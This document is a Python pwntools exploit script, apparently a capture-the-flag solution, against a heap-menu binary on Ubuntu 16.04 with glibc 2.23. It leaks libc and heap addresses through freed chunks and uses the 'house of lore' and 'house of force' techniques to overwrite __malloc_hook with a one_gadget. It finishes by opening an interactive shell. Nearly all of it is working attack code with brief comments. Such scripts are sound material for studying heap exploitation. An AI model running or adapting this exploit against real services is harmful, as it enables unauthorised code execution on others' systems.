from pwn import *

# Tested on Ubuntu 16.04

def menu(n):
	r.sendafter("Exit\n", str(n) + "\n")

def add(i, sz, c):
	menu(1)
	r.sendafter("Index: ", str(i) + "\n")
	r.sendafter("Enter the size: ", str(sz) + "\n")
	r.sendafter("Enter the content: ", c + "\n")

def update(i, c):
	menu(2)
	r.sendafter("Index: ", str(i) + "\n")
	r.sendafter("Enter the content: ", c + "\n")

def printa(i):
	menu(3)
	r.sendafter("Index: ", str(i) + "\n")
	r.recvline()
	return r.recv(8)

def delete(i):
	menu(4)
	r.sendafter("Index: ", str(i) + "\n")	

def salir():
	menu(5)

'''
buffer_2->fd = victim
buffer_2->bk = buffer_1
buffer_1->fd = buffer_2
victim->bk   = buffer_2
'''

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

prev_inuse = 0x1

r = remote("localhost", 4444)

add(0, 256, "")
add(1, 256, "")
add(2, 256, "")
add(3, 256, "")
delete(0)
delete(2)
data = printa(0)
libc_base = u64(data[:16].ljust(8, '\0')) - 0x3c4b78
data = printa(2)
heap = u64(data[:16].ljust(8, '\0'))
one_gadget = libc_base + 0x4526a
delete(1)
delete(3)
# start house of lore
add(0, 128, "") # buffer_2 += 0x0
add(1, 128, "") # buffer_1 += 0x90
add(2, 512, "") # victim   += 0x120
update(0, p64(heap + 0x120) + p64(heap + 0x90))
update(1, p64(heap))
add(3, 512, "")
delete(2)
add(4, 1024, "")
update(2, p64(0) + p64(heap))
add(5, 512, "")
add(6, 512, "") # ptr to buffer2 & can overflow :)

delete(3)
delete(4)
delete(5)
update(6, "\x00"*0x118 + p64(0xffffffffffffffff)) # house of force
# exploiting
malloc_hook = libc_base + libc.symbols['__malloc_hook']
top = heap + 0x128
distance = malloc_hook - 0x10 - top - 0x8 # + prev_inuse
add(7, distance, "")
add(8, 4096, "")
update(8, p64(one_gadget))

print "[+] heap: 0x%08x" % heap
print "[+] libc_base: 0x%08x" % libc_base
print "[+] one_gadget: 0x%08x" % one_gadget
print "[+] top: 0x%x" % top
print "[+] malloc_hook: 0x%x" % malloc_hook
print "[+] distance to malloc_hook: 0x%x" % distance
print "[+] create with index 9 size >= 0x80 and get the shell :)"

r.interactive()



